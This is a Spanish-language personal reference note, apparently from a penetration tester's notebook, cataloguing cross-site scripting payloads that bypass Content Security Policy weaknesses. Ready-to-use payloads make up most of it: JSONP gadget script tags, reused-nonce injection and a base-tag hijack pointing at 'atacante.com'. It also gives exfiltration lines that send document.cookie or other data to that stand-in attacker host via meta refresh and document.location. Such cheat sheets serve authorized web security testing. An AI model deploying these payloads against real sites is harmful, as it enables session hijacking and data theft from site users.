---
tipo: meta
aliases:
  - CSP bypass payloads
tags:
  - meta/referencia
  - dominio/web
---

# XSS bypass de CSP - matriz de referencia

> [!info] Referencia pura, no un zettel
> El criterio —cómo leer la política y decidir si tiene hueco— está en [[XSS - CSP]]. Acá los gadgets por tipo de debilidad. `yi``  ` copia.

## 0. Leer la política primero

`Content-Security-Policy:` en los headers de la respuesta. Pegarla en el CSP Evaluator de Google, o revisar a mano:

`unsafe-inline` en `script-src`  → no hay CSP efectivo: payload inline directo.
Un dominio de terceros en `script-src`  → buscar gadget ahí.
`nonce-...`  → ¿se repite entre respuestas? ¿es predecible?
Falta `base-uri`  → inyección de `<base>`.
Falta `object-src 'none'`  → `<object>`/`<embed>`.

## `unsafe-inline` presente

`<script>alert(document.domain)</script>`
No hay nada que saltear: la política permite inline. Reportar la CSP como inútil.

## Dominio permitido con gadget JSONP

Si `script-src` permite un dominio con endpoint JSONP:

`<script src="https://permitido.com/api/jsonp?callback=alert(document.domain)//"></script>`
El callback JSONP ejecuta tu función. Lista de endpoints conocidos: repo `JSONBee`.

`<script src="https://www.google.com/complete/search?client=chrome&jsonp=alert(1)"></script>`
Ejemplo clásico con un dominio de Google si está permitido.

## `strict-dynamic`

`strict-dynamic` confía en scripts cargados por un script ya confiable. Si hay un gadget que crea `<script>` a partir de datos controlables, se abusa la cadena. Depende del gadget específico de la app (bibliotecas tipo Angular/AngularJS viejas son la fuente típica).

## `nonce` reutilizado

Si el `nonce` se repite entre respuestas, se lo lee de una respuesta y se reusa:

`<script nonce="NONCE_LEAKEADO">alert(document.domain)</script>`
Solo funciona si el nonce no cambia por request.

## Falta `base-uri`

`<base href="https://atacante.com/">`
Cambia la base de las URLs relativas: los `<script src="app.js">` de la página pasan a cargar desde tu dominio. Requiere que la app use rutas relativas.

## Falta `object-src`

`<object data="data:text/html,<script>alert(1)</script>"></object>`
Si `object-src` no está en `'none'`.

## Exfil pese a `connect-src` estricto

Cuando ejecutás pero `connect-src` bloquea el `fetch` de salida:

`<meta http-equiv="refresh" content="0;url=https://atacante.com/?c=DATA">`
Navegación en vez de fetch — a veces `connect-src` no cubre navegación.

`document.location='https://atacante.com/?c='+document.cookie`
Si `navigation` no está restringida por la política.

## Relacionadas

[[XSS - CSP]] · [[MOC - Cross-site scripting]] · [[XSS impacto - matriz de referencia]]
